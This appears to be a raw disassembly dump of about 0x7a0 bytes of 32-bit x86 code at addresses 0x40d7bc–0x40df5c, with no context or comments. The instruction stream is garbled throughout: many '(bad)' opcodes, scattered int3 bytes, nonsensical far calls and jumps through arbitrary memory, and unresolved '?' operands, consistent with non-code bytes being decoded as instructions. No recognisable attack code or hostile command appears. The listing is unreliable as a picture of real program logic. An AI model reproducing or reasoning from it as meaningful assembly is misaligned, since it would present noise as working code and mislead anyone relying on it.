  40d7bc:	sbb    edi,edi
  40d7be:	imul   eax,DWORD PTR [eax],0xff6b11ff
  40d7c4:	fild   WORD PTR [ebx+0x3cc4d]
  40d7ca:	(bad)  
  40d7cb:	jns    0x40d837
  40d7cd:	inc    DWORD PTR [esi+0x0]
  40d7d0:	int3   
  40d7d1:	fmul   DWORD PTR [ecx]
  40d7d3:	add    dh,bl
  40d7d5:	add    ch,dl
  40d7d7:	add    BYTE PTR [eax],bh
  40d7d9:	(bad)  
  40d7da:	call   FWORD PTR [edi-0x63]
  40d7dd:	add    BYTE PTR [eax+0x0],bl
  40d7e0:	jmp    DWORD PTR [ecx-0x7c3e7c46]
  40d7e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7e7:	add    BYTE PTR [ebx+0x688aff83],bh
  40d7ed:	(bad)  
  40d7ee:	mov    esi,0x225600ff
  40d7f3:	add    DWORD PTR [ebx],0xffffffff
  40d7f6:	jp     0x40d7f8
  40d7f8:	and    al,BYTE PTR [eax]
  40d7fa:	mov    DWORD PTR [esi-0x92ffd7],edx
  40d800:	(bad)  
  40d801:	mov    edx,0xff6883e1
  40d806:	mov    ebx,0xffcc7183
  40d80b:	bnd ret 
  40d80d:	sub    esp,0xffffff83
  40d810:	jmp    DWORD PTR ds:0xffb8ff3a
  40d816:	xchg   ebx,eax
  40d817:	add    BYTE PTR [ebx],dh
  40d819:	int3   
  40d81a:	(bad)  
  40d81b:	out    dx,eax
  40d81c:	ds (bad) 
  40d81e:	mov    esp,0xebe00083
  40d823:	sbb    DWORD PTR [edx-0x1],0x20
  40d827:	int3   
  40d828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d829:	add    bh,bh
  40d82b:	sub    eax,0x5b8917
  40d830:	inc    DWORD PTR [edi]
  40d832:	cmc    
  40d833:	(bad)  
  40d834:	in     al,dx
  40d835:	add    ah,al
  40d837:	inc    esi
  40d839:	add    bh,bh
  40d83b:	cmp    ecx,edi
  40d83d:	add    BYTE PTR [eax],cl
  40d83f:	(bad)  
  40d840:	call   DWORD PTR [ecx+0xad001b]
  40d846:	dec    esp
  40d847:	add    esp,0xffffffff
  40d84a:	add    dh,dh
  40d84c:	sbb    ecx,esp
  40d84e:	out    0xff,al
  40d850:	int3   
  40d851:	mov    eax,ds:0x8390ff37
  40d856:	lahf   
  40d857:	add    BYTE PTR [ebp-0x1],ch
  40d85a:	push   DWORD PTR [edi+0x28]
  40d85d:	jmp    DWORD PTR [ebx+eax*4-0x77]
  40d861:	clc    
  40d862:	mov    dh,0x0
  40d864:	add    edi,edi
  40d866:	mov    esp,0xff00e500
  40d86b:	push   cs
  40d86c:	add    BYTE PTR gs:[edi],ah
  40d86f:	(bad)  
  40d870:	call   FWORD PTR [esi]
  40d872:	mov    ecx,0xd4004100
  40d877:	add    ah,bh
  40d879:	inc    DWORD PTR [eax]
  40d87b:	xlat   BYTE PTR ds:[ebx]
  40d87c:	xor    eax,0xffff54ff
  40d881:	lock aad 0xff
  40d884:	xchg   esp,eax
  40d885:	(bad)  
  40d886:	mov    esp,0xcc00b189
  40d88b:	cdq    
  40d88c:	mov    ebx,0x83cca4ff
  40d891:	jg     0x40d88d
  40d893:	call   edi
  40d895:	add    BYTE PTR [edx],bh
  40d897:	inc    DWORD PTR [ebx+eax*4]
  40d89a:	jmp    FWORD PTR [esi]
  40d89c:	jno    0x40d89d
  40d89e:	stos   BYTE PTR es:[edi],al
  40d89f:	dec    DWORD PTR [ecx-0x2e00564e]
  40d8a5:	add    BYTE PTR [ebx],bh
  40d8a7:	add    BYTE PTR [ecx+0x0],cl
  40d8aa:	add    BYTE PTR [eax-0x10ffcc],ah
  40d8b0:	add    BYTE PTR [esi],dh
  40d8b2:	cwde   
  40d8b3:	jmp    esi
  40d8b5:	inc    DWORD PTR [edi+edi*8+0x3dffff73]
  40d8bc:	in     al,dx
  40d8bd:	add    dl,dh
  40d8bf:	dec    DWORD PTR [ecx-0x21004323]
  40d8c5:	dec    DWORD PTR [edi+0x0]
  40d8c8:	fs add bh,bh
  40d8cb:	mov    ss,ecx
  40d8cd:	and    ebx,0xffffffff
  40d8d0:	mov    DWORD PTR [ebx-0x77],ebx
  40d8d3:	add    ah,dh
  40d8d5:	jmp    FWORD PTR [ebx]
  40d8d7:	mov    DWORD PTR [esi],esi
  40d8d9:	inc    DWORD PTR [ebx-0x6f005b18]
  40d8df:	add    bh,bh
  40d8e1:	test   eax,edi
  40d8e3:	call   FWORD PTR [eax]
  40d8e5:	add    dl,dl
  40d8e7:	(bad)  
  40d8e8:	fiadd  DWORD PTR [eax]
  40d8ea:	dec    DWORD PTR [edx-0x6f]
  40d8ed:	jmp    FWORD PTR [edx]
  40d8ef:	int3   
  40d8f0:	(bad)  
  40d8f1:	ds or  eax,0xbeff0f83
  40d8f7:	mov    edi,edx
  40d8f9:	add    ah,cl
  40d8fb:	sar    DWORD PTR [edx-0x1],1
  40d8fe:	mov    esi,0x5c580083
  40d903:	add    BYTE PTR [ebx-0x1],dh
  40d906:	outs   dx,BYTE PTR ds:[esi]
  40d907:	and    DWORD PTR [eax],0xffffff83
  40d90a:	push   DWORD PTR [ecx+0xb]
  40d90d:	push   DWORD PTR [edx-0x4a10000]
  40d913:	(bad)  
  40d914:	in     al,dx
  40d915:	mov    DWORD PTR [ebp-0x1],edi
  40d918:	jno    0x40d89d
  40d91a:	add    BYTE PTR [esi+ebp*1+0x0],dh
  40d91e:	retf   0x83ff
  40d921:	push   0xffffffb0
  40d923:	mov    ebx,esi
  40d925:	adc    DWORD PTR ds:0xff003783,0x36
  40d92c:	inc    DWORD PTR ss:[edx]
  40d92f:	add    BYTE PTR [ecx+0x31fffb9a],cl
  40d935:	int3   
  40d936:	out    0xff,eax
  40d938:	(bad)  
  40d939:	inc    DWORD PTR [eax]
  40d93b:	mov    ah,0xfe
  40d93d:	call   DWORD PTR [ebp-0x1]
  40d940:	call   DWORD PTR [ebx+edx*1+0x0]
  40d944:	xor    al,0xff
  40d946:	test   bh,bh
  40d948:	bound  eax,QWORD PTR [eax]
  40d94a:	call   FWORD PTR [edi-0x1d7c62]
  40d950:	push   DWORD PTR [edx+ebx*4-0x40339d01]
  40d957:	int3   
  40d958:	or     DWORD PTR [eax],eax
  40d95a:	push   edi
  40d95c:	ja     0x40d95d
  40d95e:	xlat   BYTE PTR ds:[ebx]
  40d95f:	add    BYTE PTR [ecx+0x3000db1d],cl
  40d965:	push   DWORD PTR [esi]
  40d967:	call   FWORD PTR [esi+0x54f6ffff]
  40d96d:	jmp    FWORD PTR [ecx]
  40d96f:	inc    DWORD PTR [eax]
  40d971:	test   al,0x1f
  40d973:	add    BYTE PTR [eax],ch
  40d975:	add    BYTE PTR [edi+edi*8],bl
  40d978:	lock add bh,bh
  40d97b:	sub    ebx,DWORD PTR [ebx]
  40d97d:	cmp    DWORD PTR [eax+eax*1],0xffffffff
  40d981:	or     al,0xb7
  40d983:	add    BYTE PTR [ebp-0x34],ch
  40d986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d987:	add    BYTE PTR [ebx-0x22207d00],dl
  40d98d:	add    BYTE PTR [ebx],ah
  40d98f:	add    BYTE PTR [ebx-0x30002f35],al
  40d995:	push   ebp
  40d997:	add    BYTE PTR [edi],dh
  40d999:	(bad)  
  40d99a:	call   FWORD PTR [edx]
  40d99c:	push   ebp
  40d99d:	and    DWORD PTR [edi-0x552d7601],0x0
  40d9a4:	cmp    bh,0x19
  40d9a7:	dec    eax
  40d9a9:	inc    DWORD PTR [eax]
  40d9ab:	jmp    0xcbda85
  40d9b0:	or     DWORD PTR [edx-0x7aff7c],0xffffffa8
  40d9b7:	dec    edi
  40d9b9:	int3   
  40d9ba:	add    BYTE PTR [eax+0x57],al
  40d9bd:	add    dl,dl
  40d9bf:	add    BYTE PTR [ebx+0x100028cc],al
  40d9c5:	jmp    FWORD PTR [ebx]
  40d9c7:	jmp    FWORD PTR [edi+0x139affff]
  40d9cd:	push   DWORD PTR [eax]
  40d9cf:	int3   
  40d9d0:	mov    ebx,ecx
  40d9d2:	in     al,0xff
  40d9d4:	push   eax
  40d9d5:	add    BYTE PTR [eax+0xffc783],cl
  40d9db:	popa   
  40d9dc:	out    0xff,al
  40d9de:	lods   al,BYTE PTR ds:[esi]
  40d9df:	add    bh,bh
  40d9e1:	fwait
  40d9e2:	xchg   edi,eax
  40d9e3:	(bad)  
  40d9e4:	aas    
  40d9e5:	add    dh,dh
  40d9e7:	dec    DWORD PTR [ebx+eax*4-0x7d]
  40d9eb:	xor    BYTE PTR [edi+0x0],0xd
  40d9ef:	add    BYTE PTR [ebx+0x5cffe5ed],al
  40d9f5:	int3   
  40d9f6:	jb     0x40d9f8
  40d9f8:	inc    esp
  40d9f9:	(bad)  
  40d9fa:	push   eax
  40d9fc:	jbe    0x40d981
  40d9fe:	pop    esi
  40d9ff:	add    bh,bh
  40da01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da02:	xor    al,0x0
  40da04:	mov    ds:0xa80097ff,al
  40da09:	(bad)  
  40da0a:	call   DWORD PTR [ebx+0x34]
  40da0d:	jmp    FWORD PTR [eax+0x455fff00]
  40da13:	adc    DWORD PTR [edx],0xffffff83
  40da16:	and    edi,edi
  40da18:	inc    DWORD PTR [ebx-0xf1e601]
  40da1e:	je     0x40da1f
  40da20:	cmp    DWORD PTR [esi-0xc73343],0x57
  40da27:	(bad)  
  40da28:	mov    eax,0x6185ff00
  40da2d:	add    BYTE PTR [ebx+eax*4],cl
  40da30:	call   DWORD PTR [ecx]
  40da32:	push   ss
  40da33:	or     DWORD PTR [edi],0xffffffcc
  40da36:	xchg   esp,eax
  40da37:	adc    DWORD PTR [ecx],0x0
  40da3a:	mov    DWORD PTR [ecx+0x5a8353],esp
  40da40:	call   ebx
  40da42:	or     eax,0x66fff9ff
  40da47:	add    BYTE PTR [eax-0x1],ah
  40da4a:	mov    DWORD PTR [eax],ebx
  40da4c:	repz add DWORD PTR [edi],0x0
  40da50:	mov    DWORD PTR [edx-0x33f40082],edx
  40da56:	stos   DWORD PTR es:[edi],eax
  40da57:	call   FWORD PTR [edi+edi*8-0x1]
  40da5b:	inc    eax
  40da5c:	add    BYTE PTR [bx+0x0],ch
  40da61:	jg     0x40daa2
  40da63:	add    BYTE PTR [ebx+eax*4],cl
  40da66:	out    0xff,al
  40da68:	stos   BYTE PTR es:[edi],al
  40da69:	(bad)  
  40da6a:	inc    DWORD PTR ds:0xff82ff1a
  40da70:	mov    DWORD PTR [ebx+edi*4+0x78008eff],ebx
  40da77:	add    ch,bh
  40da79:	or     DWORD PTR [ecx-0x68ffeacc],0x0
  40da80:	and    DWORD PTR [ecx+0x5a],0xffffffff
  40da84:	mov    ds:0x73007100,eax
  40da89:	add    DWORD PTR [eax],0xffffff82
  40da8c:	(bad)  
  40da8d:	push   DWORD PTR [ebx+0x156effff]
  40da93:	int3   
  40da94:	jl     0x40da96
  40da96:	or     eax,0xffffb783
  40da9b:	add    edx,DWORD PTR [ebx-0xb977]
  40daa1:	mov    WORD PTR [edi-0x1],?
  40daa4:	mov    al,0xcc
  40daa6:	push   ebp
  40daa7:	add    bl,bl
  40daa9:	add    bh,bh
  40daab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daac:	xchg   edx,eax
  40daad:	call   DWORD PTR [ebp+0x68c4ff00]
  40dab3:	jmp    DWORD PTR [eax-0x1e001300]
  40dab9:	int3   
  40daba:	or     DWORD PTR [edi+0x48],0x0
  40dabe:	(bad)  
  40dabf:	dec    DWORD PTR [ecx-0xc00e1d7]
  40dac5:	call   FWORD PTR [ebp-0xa67d]
  40dacb:	gs jecxz 0x40dace
  40dace:	push   edx
  40dacf:	inc    DWORD PTR [eax]
  40dad1:	lea    eax,[esi-0x1]
  40dad4:	outs   dx,BYTE PTR ds:[esi]
  40dad5:	int3   
  40dad6:	add    BYTE PTR cs:[edx],bh
  40dad9:	inc    DWORD PTR [eax]
  40dadb:	es dec ebx
  40dadd:	add    bh,bh
  40dadf:	add    bh,bh
  40dae1:	pop    esi
  40dae2:	aaa    
  40dae3:	mov    DWORD PTR [edi+edi*8-0x5fff4f],ecx
  40daea:	add    BYTE PTR [ebp-0x6b0067],ah
  40daf0:	add    BYTE PTR [esi-0x33],ch
  40daf3:	push   DWORD PTR [eax+0x0]
  40daf6:	adc    cl,ah
  40daf8:	pop    eax
  40daf9:	inc    DWORD PTR [ebx+0x7fff70e9]
  40daff:	add    bh,bh
  40db01:	gs add eax,0xdbff3dcc
  40db07:	or     DWORD PTR [eax-0x1],0xffffffcc
  40db0b:	fs push esp
  40db0d:	(bad)  
  40db0e:	sti    
  40db0f:	add    BYTE PTR [eax],al
  40db11:	xor    eax,0xff208394
  40db16:	xor    bh,bh
  40db18:	ss (bad) 
  40db1a:	(bad)  
  40db1b:	jmp    0x40db7e
  40db1d:	add    cl,cl
  40db1f:	inc    DWORD PTR [eax]
  40db21:	jbe    0x40dab6
  40db23:	push   ebx
  40db25:	call   DWORD PTR [ebx-0xff3201]
  40db2b:	dec    edx
  40db2c:	mov    bh,bh
  40db2e:	cmp    eax,0x5f2cffcc
  40db33:	push   DWORD PTR [eax]
  40db35:	mov    ebx,edx
  40db37:	xor    DWORD PTR [ebp-0x34],0xffffff83
  40db3b:	outs   dx,DWORD PTR ds:[esi]
  40db3c:	sahf   
  40db3d:	(bad)  
  40db3e:	(bad)  
  40db40:	add    BYTE PTR [edi],dl
  40db42:	popf   
  40db43:	int3   
  40db44:	pushf  
  40db45:	call   DWORD PTR [ebx]
  40db47:	add    BYTE PTR [ebx-0x1],bh
  40db4a:	add    BYTE PTR [edi+0x21],ch
  40db4d:	add    cl,bh
  40db4f:	int3   
  40db50:	mov    DWORD PTR [ebx+0x31],esp
  40db53:	add    BYTE PTR [edi],dl
  40db55:	add    BYTE PTR [esi+0x0],ah
  40db58:	clc    
  40db59:	inc    DWORD PTR [eax]
  40db5b:	sub    eax,0xff6500b6
  40db60:	add    BYTE PTR [esi-0xce0035],bh
  40db66:	adc    bh,bh
  40db68:	push   ebp
  40db69:	dec    esp
  40db6b:	scas   al,BYTE PTR es:[edi]
  40db6c:	js     0x40db6d
  40db6e:	addr16 (bad) 
  40db70:	call   DWORD PTR [esi+0x46]
  40db73:	(bad)  
  40db74:	jns    0x40daf9
  40db76:	add    edi,edi
  40db78:	pop    ss
  40db79:	inc    DWORD PTR [eax]
  40db7b:	pop    ds
  40db7c:	in     eax,dx
  40db7d:	add    BYTE PTR [ebx],dh
  40db7f:	add    bh,bh
  40db81:	cmc    
  40db82:	ja     0x40db0d
  40db84:	add    DWORD PTR [ebx-0x95ff0b],eax
  40db8a:	add    BYTE PTR [ebp+edi*2-0xf301],ch
  40db91:	outs   dx,DWORD PTR ds:[esi]
  40db92:	(bad)  
  40db93:	int3   
  40db94:	sar    bh,cl
  40db96:	(bad)  
  40db97:	mov    DWORD PTR [eax+eax*1-0x7c253800],esi
  40db9e:	mov    eax,DWORD PTR [eax]
  40dba0:	add    dl,ch
  40dba2:	or     al,0xff
  40dba4:	pop    es
  40dba5:	add    BYTE PTR [edx-0x767c3301],dl
  40dbab:	add    bh,bh
  40dbad:	add    BYTE PTR [eax],al
  40dbaf:	sbb    DWORD PTR [ecx+0x6becffff],0xffffff83
  40dbb6:	mov    bh,0xff
  40dbb8:	sar    bh,cl
  40dbba:	call   FWORD PTR ds:0xcc4eff1a
  40dbc0:	xchg   edi,eax
  40dbc1:	add    BYTE PTR [eax],al
  40dbc3:	call   0xffabdb56
  40dbc8:	mov    edi,0x99eb00ff
  40dbcd:	jmp    esi
  40dbcf:	add    BYTE PTR [ecx-0x67070000],bl
  40dbd5:	int3   
  40dbd6:	mov    edi,?
  40dbd8:	push   ebx
  40dbd9:	add    bh,bh
  40dbdb:	aam    0xef
  40dbdd:	int3   
  40dbde:	jbe    0x40dbe0
  40dbe0:	fdivp  st(7),st
  40dbe2:	int3   
  40dbe3:	pop    ebx
  40dbe4:	mov    al,0x0
  40dbe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbe7:	call   FWORD PTR [edi+edi*8]
  40dbea:	add    BYTE PTR [esi-0x60027],al
  40dbf0:	push   es
  40dbf1:	add    BYTE PTR [eax],al
  40dbf3:	pop    es
  40dbf4:	icebp  
  40dbf5:	push   edi
  40dbf7:	add    BYTE PTR [edi+0x0],cl
  40dbfa:	int3   
  40dbfb:	mov    ebx,0xff2689e2
  40dc00:	nop
  40dc01:	(bad)  
  40dc02:	jmp    FWORD PTR [edi-0x63]
  40dc05:	push   eax
  40dc07:	jmp    DWORD PTR [edx-0x1]
  40dc0a:	add    dh,ah
  40dc0c:	jne    0x40dc0d
  40dc0e:	out    dx,al
  40dc0f:	add    ah,dl
  40dc11:	add    bh,bh
  40dc13:	xchg   edx,eax
  40dc14:	jg     0x40dbe2
  40dc16:	adc    cl,ah
  40dc18:	xor    DWORD PTR [eax],eax
  40dc1a:	add    BYTE PTR [esi+edi*8],ch
  40dc1d:	add    BYTE PTR [eax],ah
  40dc1f:	mov    DWORD PTR [eax+0x29e88300],esp
  40dc25:	add    BYTE PTR [ebx-0x76f87d],ch
  40dc2b:	or     BYTE PTR [eax+0x0],bl
  40dc2e:	vcmpps ymm1,ymm6,YMMWORD PTR [ecx+0xa1800],0x91
  40dc37:	and    DWORD PTR ds:0x56f00ff,0xffffffff
  40dc3e:	test   BYTE PTR [eax],al
  40dc40:	dec    edx
  40dc41:	add    BYTE PTR [ebx+0x22003995],al
  40dc47:	int3   
  40dc48:	int    0x0
  40dc4a:	call   DWORD PTR [esi]
  40dc4c:	stos   DWORD PTR es:[edi],eax
  40dc4d:	(bad)  
  40dc4e:	fild   WORD PTR [eax]
  40dc50:	jno    0x40dc51
  40dc52:	(bad)  
  40dc53:	jmp    0x40dc8a
  40dc55:	inc    DWORD PTR [ebx+0xffc983]
  40dc5b:	cmp    DWORD PTR [esi-0x7d],ecx
  40dc5e:	out    0xff,eax
  40dc60:	cs add bh,bh
  40dc63:	fistp  QWORD PTR ds:0x21ff5aff
  40dc69:	dec    DWORD PTR [ecx-0x55ff3329]
  40dc6f:	add    BYTE PTR [ebx+0x3a6989ff],ah
  40dc75:	add    al,cl
  40dc77:	xor    eax,0xffffffff
  40dc7a:	add    BYTE PTR [eax+0x69],ah
  40dc7d:	sbb    DWORD PTR [edi+edi*8-0x6],0x0
  40dc82:	sub    DWORD PTR [ebx+0x77],0xffffffff
  40dc86:	mov    cl,ah
  40dc88:	inc    ebx
  40dc89:	inc    DWORD PTR [eax]
  40dc8b:	xor    edi,DWORD PTR [esi]
  40dc8d:	cmp    DWORD PTR [edi-0x764501],0x2
  40dc94:	sub    edi,edi
  40dc96:	adc    eax,DWORD PTR [ebx+0x5400837a]
  40dc9c:	je     0x40dc21
  40dc9e:	out    dx,al
  40dc9f:	inc    DWORD PTR [ecx+0x55a8ffff]
  40dca5:	int3   
  40dca6:	fld    QWORD PTR [eax]
  40dca8:	data16 add BYTE PTR [eax],al
  40dcab:	icebp  
  40dcac:	lods   eax,DWORD PTR ds:[esi]
  40dcad:	call   FWORD PTR ds:0xff5100
  40dcb3:	aad    0xb8
  40dcb5:	int3   
  40dcb6:	add    BYTE PTR ss:[ebx+0x42e1ffff],bl
  40dcbd:	add    DWORD PTR [esi],0xffffff89
  40dcc0:	add    DWORD PTR [ebx-0x5b377d],0xfff9ffb9
  40dcca:	jmp    DWORD PTR [edx-0x4dff63]
  40dcd0:	mov    edi,edi
  40dcd2:	mov    eax,ebp
  40dcd4:	call   0xffff:0xbfffe483
  40dcdb:	sbb    eax,DWORD PTR [eax]
  40dcdd:	add    BYTE PTR [eax+eax*1],ch
  40dce0:	cwde   
  40dce1:	inc    DWORD PTR [ebx+0x3dffd2e4]
  40dce7:	(bad)  
  40dce8:	in     al,dx
  40dce9:	add    bh,bh
  40dceb:	pop    ebx
  40dcec:	mov    eax,ds:0xde008183
  40dcf1:	inc    DWORD PTR [eax]
  40dcf3:	test   DWORD PTR ds:0x7cff70ff,esi
  40dcf9:	add    BYTE PTR [eax],al
  40dcfb:	cwde   
  40dcfc:	sti    
  40dcfd:	add    bl,ah
  40dcff:	add    dl,cl
  40dd01:	(bad)  
  40dd02:	call   FWORD PTR [ebx+0x3dff3d]
  40dd08:	outs   dx,DWORD PTR ds:[esi]
  40dd09:	inc    DWORD PTR [eax]
  40dd0b:	scas   al,BYTE PTR es:[edi]
  40dd0c:	pop    eax
  40dd0d:	sub    esi,0x0
  40dd10:	cmp    edi,edi
  40dd12:	xor    DWORD PTR ds:0x5a0005,0x9
  40dd19:	(bad)  
  40dd1a:	call   DWORD PTR [edx-0xdd3304]
  40dd20:	dec    edx
  40dd21:	int3   
  40dd22:	add    ah,bl
  40dd24:	add    al,0xcc
  40dd26:	mov    bl,0x83
  40dd28:	xor    DWORD PTR [eax],eax
  40dd2a:	and    DWORD PTR [edx-0x4],0xffffff89
  40dd2e:	push   ds
  40dd2f:	push   DWORD PTR [edi+edi*8]
  40dd32:	(bad)  
  40dd33:	fisub  WORD PTR [eax+eax*1-0x1ff2c]
  40dd3a:	add    BYTE PTR [edi+edx*1+0x0],ch
  40dd3e:	sti    
  40dd3f:	call   FWORD PTR [ebx+0x0]
  40dd42:	call   DWORD PTR [edi]
  40dd44:	inc    DWORD PTR [eax]
  40dd46:	dec    edi
  40dd47:	add    BYTE PTR [edi],bh
  40dd49:	(bad)  
  40dd4a:	call   esp
  40dd4c:	or     al,0xff
  40dd4e:	fdivp  st(7),st
  40dd50:	aam    0x83
  40dd52:	add    bh,al
  40dd54:	sub    cl,BYTE PTR [ecx+0x3e00ab]
  40dd5a:	adc    eax,0xffffffbb
  40dd5d:	jmp    FWORD PTR [edi]
  40dd5f:	add    BYTE PTR [ecx],dh
  40dd61:	add    BYTE PTR [eax],al
  40dd63:	lea    ebx,[ebp-0x62ff3701]
  40dd69:	add    BYTE PTR [eax],al
  40dd6b:	jle    0x40dcfa
  40dd6d:	cmp    DWORD PTR ds:0xff4cff,0x13
  40dd74:	or     al,0xff
  40dd76:	inc    esp
  40dd77:	add    BYTE PTR [ebp-0x22570001],bh
  40dd7d:	add    BYTE PTR [edi-0x34],bl
  40dd80:	in     eax,0x0
  40dd82:	add    DWORD PTR [ecx],0x36
  40dd85:	sbb    DWORD PTR [esi],0xffffff83
  40dd88:	xchg   edx,eax
  40dd89:	int3   
  40dd8a:	inc    DWORD PTR [edx-0x39007e]
  40dd90:	pop    edi
  40dd91:	add    bh,bh
  40dd93:	push   0xffffffca
  40dd95:	call   FWORD PTR [edx]
  40dd97:	add    BYTE PTR [esi],bl
  40dd99:	add    bh,bh
  40dd9b:	js     0x40dd82
  40dd9d:	add    BYTE PTR [edx-0x1],al
  40dda0:	loope  0x40dda1
  40dda2:	sbb    DWORD PTR [esi+0xb],0x0
  40dda6:	aad    0x83
  40dda8:	scas   eax,DWORD PTR es:[edi]
  40dda9:	add    ah,cl
  40ddab:	into   
  40ddac:	jnp    0x40ddad
  40ddae:	out    dx,eax
  40ddaf:	(bad)  
  40ddb0:	std    
  40ddb1:	(bad)  
  40ddb2:	push   DWORD PTR [ebp-0x7]
  40ddb5:	mov    DWORD PTR [edi+edi*8-0xe],edi
  40ddb9:	or     esp,0x5c
  40ddbc:	in     eax,0x0
  40ddbe:	mov    dh,0x0
  40ddc0:	je     0x40ddc1
  40ddc2:	call   FWORD PTR [esi-0x334833ef]
  40ddc8:	pop    eax
  40ddc9:	add    BYTE PTR [ebx+0x7a83ca0c],al
  40ddcf:	inc    DWORD PTR [edx+0x0]
  40ddd2:	(bad)  
  40ddd3:	mov    edx,0xff97ff78
  40ddd8:	dec    ebx
  40ddd9:	add    BYTE PTR [eax],al
  40dddb:	in     al,0xee
  40dddd:	jmp    DWORD PTR [eax-0x7d]
  40dde0:	fdivp  st(7),st
  40dde2:	call   DWORD PTR [edi+0x71ff85]
  40dde8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dde9:	add    BYTE PTR [eax],al
  40ddeb:	jbe    0x40de15
  40dded:	add    BYTE PTR [ecx],dh
  40ddef:	dec    DWORD PTR [edx-0x1]
  40ddf2:	add    BYTE PTR [ecx],ch
  40ddf4:	scas   al,BYTE PTR es:[edi]
  40ddf5:	int3   
  40ddf6:	sub    al,BYTE PTR [ebx+0x43ccff1a]
  40ddfc:	cmp    bh,bh
  40ddfe:	sub    al,0xff
  40de00:	fwait
  40de01:	inc    DWORD PTR [eax]
  40de03:	(bad)  
  40de04:	cmp    edi,edi
  40de06:	pop    ebp
  40de07:	add    BYTE PTR [ebx-0x5e6ff7d],al
  40de0d:	call   FWORD PTR [eax-0x3300a901]
  40de13:	adc    ebp,DWORD PTR [eax-0x1]
  40de16:	scas   al,BYTE PTR es:[edi]
  40de17:	int3   
  40de18:	mov    ecx,0xe8598983
  40de1d:	jmp    DWORD PTR [ecx]
  40de1f:	int3   
  40de20:	pusha  
  40de21:	(bad)  
  40de22:	dec    DWORD PTR [esi]
  40de24:	lahf   
  40de25:	add    DWORD PTR [edx],0xffffffcc
  40de28:	cmp    edi,0xccc8c089
  40de2e:	sub    al,0xff
  40de30:	add    WORD PTR [eax],0xffdf
  40de34:	sub    edi,edi
  40de36:	clc    
  40de37:	add    BYTE PTR [eax],al
  40de39:	add    BYTE PTR [ebx+0x77ff0981],al
  40de3f:	or     DWORD PTR [eax+eax*1-0x1],0xffffffc0
  40de44:	xchg   esp,eax
  40de45:	add    BYTE PTR [ecx],bh
  40de47:	call   FWORD PTR [ebp-0x1]
  40de4a:	int3   
  40de4b:	pop    edx
  40de4c:	add    DWORD PTR [eax],0x48
  40de4f:	add    BYTE PTR [ebp-0x15250077],bl
  40de55:	call   FWORD PTR [esi+0xff9500]
  40de5b:	mov    ebx,DWORD PTR [ebp+0x0]
  40de5e:	mov    es,WORD PTR [eax]
  40de60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de61:	int3   
  40de62:	jmp    FWORD PTR [eax+0x6c]
  40de65:	jmp    DWORD PTR [eax-0xffc07d]
  40de6b:	jb     0x40dee1
  40de6d:	inc    DWORD PTR [ebp+0x0]
  40de70:	cmp    edi,0x0
  40de73:	pop    es
  40de74:	ins    DWORD PTR es:[edi],dx
  40de75:	call   FWORD PTR [ebx-0x5b00]
  40de7b:	in     al,dx
  40de7c:	mov    esp,0x4e00f183
  40de81:	add    bh,bh
  40de83:	js     0x40de5d
  40de85:	dec    DWORD PTR [ebx+0x0]
  40de88:	inc    ebx
  40de89:	int3   
  40de8a:	mov    esp,esp
  40de8c:	imul   eax,DWORD PTR [ebx-0xa4ffca],0x0
  40de93:	sub    eax,0xff7c0023
  40de98:	jmp    0xf22cde9c
  40de9d:	dec    DWORD PTR [eax-0x34]
  40dea0:	(bad)  
  40dea2:	jmp    DWORD PTR ds:0xff4dffa3
  40dea8:	cli    
  40dea9:	(bad)  
  40deaa:	(bad)  
  40deab:	mov    esp,0x700075
  40deb0:	jnp    0x40deb1
  40deb2:	adc    DWORD PTR [edi-0x77],0xffffffff
  40deb6:	inc    BYTE PTR [eax]
  40deb8:	(bad)  
  40deb9:	(bad)  
  40deba:	call   FWORD PTR [esi-0x33f800bc]
  40dec0:	inc    WORD PTR [eax]
  40dec3:	dec    esi
  40dec4:	aam    0x0
  40dec6:	std    
  40dec7:	add    BYTE PTR [ecx-0x1c850001],cl
  40decd:	add    bh,dh
  40decf:	call   eax
  40ded1:	add    BYTE PTR [ebx+0x1d005037],al
  40ded7:	cmp    DWORD PTR [edi-0x1],0xffffffff
  40dedb:	mov    esi,0xff3dcc4f
  40dee0:	xchg   edi,eax
  40dee1:	add    bh,bh
  40dee3:	ds aas 
  40dee5:	(bad)  
  40dee6:	mov    esp,0xff8334ff
  40deeb:	sar    edi,cl
  40deed:	push   DWORD PTR [ebx+0xff5883]
  40def3:	pop    ebp
  40def4:	cmp    bh,0x75
  40def7:	add    BYTE PTR [eax+0x4946ffff],dh
  40defd:	xor    DWORD PTR [edi],0x0
  40df00:	add    ah,cl
  40df02:	add    BYTE PTR [eax],dh
  40df04:	pop    eax
  40df05:	add    BYTE PTR [eax-0x1],cl
  40df08:	outs   dx,DWORD PTR ds:[esi]
  40df09:	or     esp,0xffffff82
  40df0c:	or     edi,edi
  40df0e:	pop    ebp
  40df0f:	jmp    DWORD PTR [ebx+0x0]
  40df12:	jmp    FWORD PTR ds:0x5cff76
  40df18:	jmp    0x40de9d
  40df1a:	int3   
  40df1b:	ficom  DWORD PTR [ebx]
  40df1d:	add    bl,dl
  40df1f:	call   esi
  40df21:	inc    DWORD PTR [eax]
  40df23:	fstp   QWORD PTR [ecx-0x1]
  40df26:	fild   WORD PTR [eax]
  40df28:	icebp  
  40df29:	inc    DWORD PTR [eax]
  40df2b:	shr    ecx,0x0
  40df2e:	sbb    al,0x89
  40df30:	pop    ebp
  40df31:	inc    DWORD PTR [eax]
  40df33:	and    al,0xf7
  40df35:	push   DWORD PTR [edi]
  40df37:	sbb    esi,0xffffffcc
  40df3a:	add    dl,bh
  40df3c:	in     al,dx
  40df3d:	jmp    FWORD PTR ds:0x6aff
  40df43:	sbb    DWORD PTR [ebx-0x34],0x23
  40df47:	dec    DWORD PTR [edx]
  40df49:	(bad)  
  40df4a:	push   DWORD PTR [ebx]
  40df4c:	jecxz  0x40df4d
  40df4e:	mov    al,BYTE PTR [eax]
  40df50:	pop    edi
  40df51:	add    bh,bh
  40df53:	repnz sar bh,cl
  40df56:	rol    DWORD PTR [eax],1
  40df58:	mov    WORD PTR [eax],es
  40df5a:	int3   
  40df5b:	push   ecx
  40df5c:	in     eax,dx
